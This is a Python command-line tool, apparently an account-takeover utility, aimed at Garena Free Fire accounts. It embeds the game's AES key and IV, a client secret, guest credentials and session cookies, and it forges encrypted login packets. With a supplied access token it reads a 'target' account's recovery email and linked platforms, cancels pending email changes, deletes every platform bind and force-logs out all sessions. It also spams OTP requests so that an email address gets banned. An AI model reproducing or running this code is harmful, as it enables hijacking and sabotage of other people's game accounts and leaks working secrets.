import requests, random, os , time
from cfonts import render
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from urllib.parse import urlparse, parse_qs
import requests , time , binascii , json , urllib3 , random
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool
import json
from protobuf_decoder.protobuf_decoder import Parser
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

Hr = {"Expect" : "100-continue" , "X-Unity-Version" : "2018.4.11f1" , "X-GA" : "v1 1" , "ReleaseVersion" : "OB53" , "Host" : "loginbp.common.ggbluefox.com"}

Z , X = '4142950809' , 'xBesTo_YMR8OS7OKU2X'      

def EnC_AEs(HeX):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(bytes.fromhex(HeX), AES.block_size)).hex()

def EnC_Uid(n):
    e = []
    while n:
        e.append((n & 0x7F) | (0x80 if n > 0x7F else 0))
        n >>= 7
    return bytes(e).hex()
    
def EnC_Vr(n):
    e = []
    while n:
        e.append((n & 0x7F) | (0x80 if n > 0x7F else 0))
        n >>= 7
    return bytes(e)

def Fix_PackEt(parsed_results):
    result_dict = {}
    for result in parsed_results:
        field_data = {}
        field_data['wire_type'] = result.wire_type
        if result.wire_type == "varint":
            field_data['data'] = result.data
        if result.wire_type == "string":
            field_data['data'] = result.data
        if result.wire_type == "bytes":
            field_data['data'] = result.data
        elif result.wire_type == 'length_delimited':
            field_data["data"] = Fix_PackEt(result.data.results)
        result_dict[result.field] = field_data
    return result_dict

def DeCode_PackEt(input_text):
    try:
        parsed_results = Parser().parse(input_text)
        parsed_results_objects = parsed_results
        parsed_results_dict = Fix_PackEt(parsed_results_objects)
        json_data = json.dumps(parsed_results_dict)
        return json_data
    except Exception as e:
        print(f"error {e}")
        return None
        
def CrEaTe_VarianT(field_number, value):
    field_header = (field_number << 3) | 0
    return EnC_Vr(field_header) + EnC_Vr(value)

def CrEaTe_LenGTh(field_number, value):
    field_header = (field_number << 3) | 2
    encoded_value = value.encode() if isinstance(value, str) else value
    return EnC_Vr(field_header) + EnC_Vr(len(encoded_value)) + encoded_value

def CrEaTe_ProTo(fields):
    packet = bytearray()    
    for field, value in fields.items():
        if isinstance(value, dict):
            nested_packet = CrEaTe_ProTo(value)
            packet.extend(CrEaTe_LenGTh(field, nested_packet))
        elif isinstance(value, int):
            packet.extend(CrEaTe_VarianT(field, value))           
        elif isinstance(value, str) or isinstance(value, bytes):
            packet.extend(CrEaTe_LenGTh(field, value))           
    return packet
    
def Ua():
    versions = [
        '4.0.18P6', '4.0.19P7', '4.0.20P1', '4.1.0P3', '4.1.5P2', '4.2.1P8',
        '4.2.3P1', '5.0.1B2', '5.0.2P4', '5.1.0P1', '5.2.0B1', '5.2.5P3',
        '5.3.0B1', '5.3.2P2', '5.4.0P1', '5.4.3B2', '5.5.0P1', '5.5.2P3'
    ]
    models = [
        'SM-A125F', 'SM-A225F', 'SM-A325M', 'SM-A515F', 'SM-A725F', 'SM-M215F', 'SM-M325FV',
        'Redmi 9A', 'Redmi 9C', 'POCO M3', 'POCO M4 Pro', 'RMX2185', 'RMX3085',
        'moto g(9) play', 'CPH2239', 'V2027', 'OnePlus Nord', 'ASUS_Z01QD',
    ]
    android_versions = ['9', '10', '11', '12', '13', '14']
    languages = ['en-US', 'es-MX', 'pt-BR', 'id-ID', 'ru-RU', 'hi-IN']
    countries = ['USA', 'MEX', 'BRA', 'IDN', 'RUS', 'IND']
    version = random.choice(versions)
    model = random.choice(models)
    android = random.choice(android_versions)
    lang = random.choice(languages)
    country = random.choice(countries)
    return f"GarenaMSDK/{version}({model};Android {android};{lang};{country};)"

def xGeT(u , p):
    try:
        r = requests.Session().post("https://100067.connect.garena.com/oauth/guest/token/grant" , headers = {"Host": "100067.connect.garena.com","User-Agent": Ua() ,"Content-Type": "application/x-www-form-urlencoded","Accept-Encoding": "gzip, deflate, br","Connection": "close"} , data = {"uid":u , "password":p , "response_type":"token" , "client_type":"2" , "client_secret":"2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3" , "client_id":"100067"} , verify = False)
        if r.status_code == 200:
            T = r.json()
            a , o = T["access_token"] , T["open_id"]
            return a , o
        else: print(r.text)   
    except: pass

def xJwT(a , o , P):
    try:
        a , o = xGeT(a,o)
        V = '1.123.2' ; dT = {3: str(datetime.now())[:-7] , 4: "free fire", 5: 1, 7: f"{V}", 8: "Android OS 9 / API-28 (PKQ1.180904.001/V11.0.3.0.PEIMIXM)", 9: "Handheld", 11: "WIFI", 12: 1500, 13: 750, 14: "332", 15: "ARM64 FP ASIMD AES | 1804 | 8", 16: 3741, 17: "Adreno (TM) 509", 18: "OpenGL ES 3.2 V@331.0 (GIT@cf57c9c, I1cb5c4d1cc) (Date:09/23/18)", 19: "Google|406ca8b5-4630-40bb-b55f-784dbde2bece", 20: "102.78.118.231", 21: "en", 22: f"{o}", 23: f"{P}", 24: "Handheld", 25: "Xiaomi Redmi Note 5", 29: f"{a}", 30: 1, 42: "WIFI", 57: "7428b253defc164018c604a1ebbfebdf", 60: 51517, 61: 2370, 62: 2976, 63: 70, 64: 2514, 65: 51517, 66: 2514, 67: 51517, 73: 1, 74: "/data/app/com.dts.freefireth-l10CEmZxhn-vvVYFJHkdqQ==/lib/arm64", 76: 1, 77: "2087f61c19f57f2af4e7feff0b24d9d9|/data/app/com.dts.freefireth-l10CEmZxhn-vvVYFJHkdqQ==/base.apk", 78: 3, 79: 2, 81: "64", 83: "2019119030", 85: 3, 86: "OpenGLES2", 87: 16383, 88: 8, 92: 41106, 93: "android", 94: "KqsHTyBIMU0qwJbf7lUlrkqNsLWqYhwn5awtbbBX/1mLp9PshUI9h3+z8PJtikeuOIdpp8H6CsamaK6s1UcHt6O6GMI=", 95: 111227, 97: 1, 98: 1, 99: f"{P}", 100: f"{P}", 102: {2: {}}}
        dT = CrEaTe_ProTo(dT).hex()
        PyL = bytes.fromhex(EnC_AEs(dT))
        r = requests.Session().post("https://loginbp.ggpolarbear.com/MajorLogin" , headers = {'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip", 'Content-Type': "application/x-www-form-urlencoded", 'Expect': "100-continue" , 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': f"OB53"} , data = PyL , verify = False)
        if r.status_code == 200:
            T = json.loads(DeCode_PackEt(binascii.hexlify(r.content).decode('utf-8')))['8']['data']
            return T
    except:
        return None
                
def GeN(T):
    R = requests.Session().get(f'https://100067.connect.garena.com/oauth/token/inspect?token={T}').json()
    return R.get('open_id') , R.get('platform')
        
def PLaTForM(T):
    r = requests.get(f"https://100067.connect.garena.com/bind/app/platform/info/get?access_token={T}").json()
    if r.get("error") in ["error_params", "error_token"]:
        return False
    elif 'bounded_accounts' in r:
        return [(x.get('platform'), x.get('uid')) for x in r['bounded_accounts']]

def LoGouT(T , JwT):   
    UrL = "https://clientbp.ggpolarbear.com/Logout"
    Hr['Authorization']= f"Bearer {JwT}"
    PyL = {1: T , 2: "Google|95793da7-3cf0-4e06-a926-d8fa4801872f" , 3: "Asus ASUS_I003DD"}
    PyL = bytes.fromhex(EnC_AEs(CrEaTe_ProTo(PyL).hex()))
    R = requests.post(UrL , data = PyL , headers = Hr)
    if R.status_code == 200: return True
    else: return False
        
console = Console()
ToKs = []

def GeTPlatForm(char):
    m = {3: "FaceBooK" , 7: "HuawEi" , 8: "GmaiL" , 10: "IcLoud" , 5: "Vk" , 11: "TwiTTer"}
    return m.get(char)
    
def convert(s):
    d,h=divmod(s,86400);h,m=divmod(h,3600);m,s=divmod(m,60)
    return f"{d} Day {h} Hour {m} Min {s} Sec"
        
def ChEcK(T):
    R = requests.Session().get(f'https://100067.connect.garena.com/oauth/token/inspect?token={T}')
    if R.status_code == 200 and 'open_id' in R.json(): return True
    return False

def ClEaR():
    os.system('cls' if os.name == 'nt' else 'clear')

def BaNNeR(N):
    ClEaR()
    print(render(f'{N}',colors=['white', random.choice(['red', 'green', 'yellow', 'blue', 'magenta', 'cyan'])],align='center'))

def C_Em(A):
    BaNNeR('spirit')
    try:
        r = requests.get("https://100067.connect.garena.com/game/account_security/bind:get_bind_info",params={'app_id':"100067",'access_token':A},headers={'User-Agent':"GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",'Connection':"Keep-Alive",'Accept-Encoding':"gzip"})
        if r.status_code == 200:
            rr = r.json()
            e = rr.get("email","")
            t = rr.get("email_to_be","")
            c = rr.get("request_exec_countdown",0)
    
            if e == "" and t: txt = f"EmaiL ToBe => {t}\nConFiRm aT => {convert(c)}"
            elif e and not t: txt = f"EmaiL CnF => {e}\nStaTus => ConFirmEd!"
            elif e and t: txt = f"EmaiL CnF => {e}\nEmaiL ToBe => {t}\nConFiRm aT => {convert(c)}"
            else: txt = "No RecovEry EmaiL!"
    except:pass
    
    console.print(Align.center(Panel(txt,title='[bold green]ChEcKinG EmaiL[/bold green]',border_style='green',width=60))) ; input()
    
def C_BinDs(A):
    BaNNeR('spirit')
    try:
        r = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",params={'app_id':"100067",'access_token':A},headers={'User-Agent':"GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",'Connection':"Keep-Alive",'Accept-Encoding':"gzip"})
        if r.status_code != 200: return
        rr = r.json()
        b = rr.get("bounded_accounts", [])
        if not b: console.print(Align.center(Panel("[bold red]No BinD AcTive![/bold red]", border_style="red", width=60))) ; time.sleep(4) ; MeNu()
        res = []
        for i in b: pid = i if isinstance(i, int) else i.get("platform") or i.get("platform_id") ; res.append(GeTPlatForm(pid) or str(pid))
        console.print(Align.center(Panel("\n".join(res), title="[bold green]BinD AcTiVinG[/bold green]", border_style="green", width=60)))
    except: pass
    input()
    
def F_EmaiL():
    BaNNeR('Fix')
    E = console.input('\n[bold green]=> EmaiL : [/bold green]')
    try:
        url = "https://sso.garena.com/api/send_register_code_email"
        payload = {'username': "K4rrem",'email': E , 'locale': "en-SG", 'format': "json", 'id': "1781263988410"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.179 Mobile Safari/537.36",
  'Accept': "application/json, text/plain, */*",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua': "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
  'sec-ch-ua-mobile': "?1",
  'Origin': "https://sso.garena.com",
  'X-Requested-With': "mark.via.gp",
  'Sec-Fetch-Site': "same-origin",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://sso.garena.com/universal/register?locale=en-SG",
  'Accept-Language': "en-US,en;q=0.9",
  'Cookie': "_hjSessionUser_6374922=eyJpZCI6ImZkYjRlNGVlLTNiYWEtNWFiNy05YzcxLWQ0NDc4YjhjNmU3ZCIsImNyZWF0ZWQiOjE3NjM1OTI0NzMxMDcsImV4aXN0aW5nIjp0cnVlfQ==; apple_state_key=ce87e162f0af11f0b499620db1df30d0; datadome=GD2M_I0w_9UKriPZOwrwAAlaCs~dbPGWyXHLl6bxMntVCtQKbaODhsVNcxLoUTs7jRX0MXkyK1IpeUyBWyFtVMxaH1RtJ8UhDu9SkhCV2GUKrXzLSnz0t62koZVdlKwt"}        
        r = requests.post(url, data=payload, headers=headers)
        if r.status_code != 200: return            
        rr = r.json()
        b = rr.get("result") == 0        
        if not b: console.print(Align.center(Panel("[bold red]ErroR FixinG EmaiL ![/bold red]", border_style="red", width=60))) ; time.sleep(3) ; MeNu() ; return            
        console.print(Align.center(Panel("[bold green]SuccEss FixinG EmaiL ![/bold green]", border_style="green", width=60))) ; time.sleep(3) ; MeNu() ; return
        
    except Exception as e: print(e)
    
def Cn_EmaiL(A):
    BaNNeR('EmaiL')
    UrL = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    PyL = {'app_id': "100067" , 'access_token': A}
    Hr = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)" , 'Connection': "Keep-Alive" , 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL , data = PyL , headers = Hr)
    if RsP.status_code == 200: console.print(Align.center(Panel("[bold green]SuccEss CanCELinG EmaiL ![/bold green]", border_style="green", width=60))) ; time.sleep(3) ; MeNu() ; return
    else: console.print(Align.center(Panel("[bold red]ErroR CanCELinG EmaiL ![/bold red]", border_style="red", width=60))) ; time.sleep(3) ; MeNu() ; return

def R_Binds(A): 
    BaNNeR('Bind')  
    UrL = "https://clientbp.ggpolarbear.com/BindDelete"
    Hr = {'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip", 'Content-Type': "application/x-www-form-urlencoded", 'Expect': "100-continue" , 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': f"OB53"}
    JwT = xJwT('4142950809' , 'xBesTo_YMR8OS7OKU2X' , 4)
    D = PLaTForM(A)
    total = len(D)
    if total == 0: console.print(Align.center(Panel("[bold red]No BinDs FounD ![/bold red]", border_style="red", width=60))) ; time.sleep(3) ; MeNu() ; return
    ClEaR()
    print(render('BinD', colors=['white', 'blue'], align='center'), '\n')
    TexT = f'[TarGeT BoT] > FF - BinD (V1.0)\n[BoT sTaTus] > [bold green]ConEcTed SuccEssFuLy SuppoRT aLL[/bold green]\n[BinDs inFo] > FounD : {total}\n[BoT DevLoPer] > AbdeeLKaRem AmiRi'
    panel = Panel(Align.center(TexT) , title="[bold blue]FF - BinD[/bold blue]" , border_style="bright_blue" , padding=(1, 2) , expand=False)
    console.print(panel)
    ReM = input('- RemovE aLL BinD ? => [Yes/No] : ')
    if ReM in ['y' , 'yes' , 'Y' , 'Yes']:
        for i , (P , U) in enumerate(D , 1):
            PyL = {1: f"{A}", 2: f"{P}", 3: f"{U}"}
            PyL = bytes.fromhex(EnC_AEs(CrEaTe_ProTo(PyL).hex()))
            Hr['Authorization']= f"Bearer {JwT}"
            R = requests.post(UrL , data = PyL , headers = Hr)
            Rr = R.content.decode() if isinstance(R.content , bytes) else R.content
            if R.status_code == 200:
                TexT = f'- STarT RemovinG BinD => {U} , {P}\n- ResPonsE => {R.status_code} , True , [bold green]SuccEssFuLy RemovE BinD[/bold green]'
                panel = Panel(Align.center(TexT) , title="[bold yellow]FF - BinD[/bold yellow]" , border_style="bright_yellow" , padding=(1, 2) , expand=False) ; console.print(panel)
            else:
                TexT = f'- STarT RemovinG BinD => {U} , {P}\n- ResPonsE => {R.status_code} , False , [bold red]FaiLeD RemovE BinD[/bold red]\n- BcZ => {Rr}'
                panel = Panel(Align.center(TexT) , title="[bold yellow]FF - BinD[/bold yellow]" , border_style="bright_yellow" , padding=(1, 1) , expand=False) ; console.print(panel)

    LoG = input('- LoGouT aLL ? => [Yes/No] : ')
    if LoG in ['y' , 'yes' , 'Y' , 'Yes']:
        L = LoGouT(T , JwT)
        if True == L:
            TexT = f'- STarT LoGouT aLL From AccounT\n- ResPonsE => True , [bold green]SuccEssFuLy LoGouT aLL[/bold green]'
            panel = Panel(Align.center(TexT) , title="[bold green]FF - BinD[/bold green]" , border_style="bright_green" , padding=(1, 2) , expand=False) ; console.print(panel)
        else: 
            TexT = f'- STarT LoGouT aLL From AccounT\n- ResPonsE => False , [bold red]FaiLeD LoGouT aLL[/bold red]'
            panel = Panel(Align.center(TexT) , title="[bold red]FF - BinD[/bold red]" , border_style="bright_red" , padding=(1, 2) , expand=False) ; console.print(panel) 
                    
def Bn_EmaiL(): 
    BaNNeR('Band')   
    E = console.input('\n[bold green]=> EmaiL : [/bold green]')
    E2 = E.replace('@hi2.in' , '.@hi2.in')
    url = "https://100067.connect.garena.com/game/account_security/swap:send_otp"  
    payload = {'app_id': "100067",'email': E, 'locale': "en_US"}
    payload2 = {'app_id': "100067",'email': E2, 'locale': "en_US"}
    headers = {
        'User-Agent': "GarenaMSDK/4.0.39(Redmi Note 5 ;Android 9;en;US;)",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Cookie': "datadome=51PRnf~WKDXs9znrqWWqSSw80aucX31DM23uXWcRmKj2yYG0971jodxjTCAQwVXxbg3NzAyqNvMZXxe9eEsQh9wy95EX2orTgJke3dbbPZ9O4EnwMPmDoUcUUiNVUfWM"}
    session = requests.Session()
    
    for i in range(10):
        try:
            r1 = session.post(url, data=payload, headers=headers, timeout=30)
            r2 = session.post(url, data=payload2, headers=headers, timeout=30)
            if r1.status_code == 200 and r2.status_code == 200:
                console.print(Align.center(Panel(f"[bold green]=> {r1.json()} / {r2.json()}[/bold green]", border_style="green", width=60)))
        except requests.exceptions.RequestException as e: time.sleep(1) ; continue
        except Exception as e: time.sleep(1) ; continue
        time.sleep(0.5)
    
    console.print(Align.center(Panel("[bold green]SuccEss BannED EmaiL ![/bold green]", border_style="green", width=60))) ; time.sleep(3) ; MeNu() ; return

def LG(A): 
    BaNNeR('logout') 
    JwT = xJwT('4142950809' , 'xBesTo_YMR8OS7OKU2X' , 4)
    L = LoGouT(A , JwT)
    if True == L:
        console.print(Align.center(Panel(f"[bold green]SuccEssFuLy LoGOuT From AccounT[/bold green]", border_style="green", width=60))) ; time.sleep(4) ; exit() ; return
    else: 
        console.print(Align.center(Panel(f"[bold red] UnSuccEssFuLy LoGOuT From AccounT[/bold red]", border_style="red", width=60))) ; time.sleep(4) ; MeNu() ; return
                        	                           
def MeNu():
    while True:
        BaNNeR('spirit')
        if not ToKs: console.print(Align.center(Panel('[red]No ToKeN FounD[/red]', width=40))) ; time.sleep(2) ; return

        try:
            R = requests.Session().get(f'https://api-otrss.garena.com/support/callback/?access_token={ToKs[0]}',allow_redirects=True)

            Q = parse_qs(urlparse(R.url).query)
            N = Q.get("nickname", ["Unknown"])[0]
            U = Q.get("account_id", ["Unknown"])[0]
            G = Q.get("region", ["Unknown"])[0]

        except:N , U , G = "UnKnowN", "UnKnowN", "UnKnowN"

        console.print(Align.center(Panel(
            f'TarGeT NamE => {N}\n'
            f'TarGeT UiD => {U}\n'
            f'TarGeT ReGioN => {G}\n'
            f'ToKen STaTus => VaLiD',
            title='[bold green]FF - SpiRiT[/bold green]',
            border_style='green', width=60)))

        console.print(Align.center(Panel(
            '[1] - ChEcK EmaiL\n'
            '[2] - ChEcK BinDs\n'
            '[3] - Fix EmaiL Cods\n'
            '[4] - CanCEL EmaiL\n'
            '[5] - DeLeTe BinDs\n'
            '[6] - BanD EmaiL (@hi2.in)\n'
            '[7] - LoGOuT aLL From AccounT\n'
            '[8] - SySTem LoGOuT',
            title='[bold yellow]MeNu[/bold yellow]',
            border_style='yellow', width=60)))

        C = console.input('\n[bold green]=> cHoosE : [/bold green]')
        if C == '1': C_Em(ToKs[0])
        if C == '2': C_BinDs(ToKs[0])
        if C == '3': F_EmaiL()
        if C == '4': Cn_EmaiL(ToKs[0])
        if C == '5': R_Binds(ToKs[0])
        if C == '6': Bn_EmaiL()
        if C == '7': LG(ToKs[0])
        elif C == '8': ToKs.clear() ; console.print(Align.center(Panel('[bold red]LoGGed OuT ...[/bold red]', border_style='red', width=40))) ; time.sleep(1); exit()

def LoGin():
    while True:
        BaNNeR('login')
        U = (
            'BoT Version => [bold red]V1.0 BeTa[/bold red]\n'
            'PowEeD By => AbdeLKaRem AmiRi\n'
            'ServER STaTus => [bold green]OnLinE[/bold green]'
        )
        console.print(Align.center(Panel(Align.center(U),title="[bold yellow]FF - SpiRiT[/bold yellow]",border_style="bright_yellow",padding=(1, 2),width=60)))
        T = console.input("\n[bold green]=> AccEss ToKen : [/bold green]")
        if ChEcK(T): console.print(Align.center(Panel("[bold green]SuccEssFuLy LoGin ...[/bold green]", border_style="green",width=40))) ; ToKs.append(T) ; time.sleep(3) ; MeNu() ; break
        console.print(Align.center(Panel("[bold red]UnSuccEssFuLy LoGin ![/bold red]" , border_style="red" , width=40)))
        time.sleep(3)

LoGin()
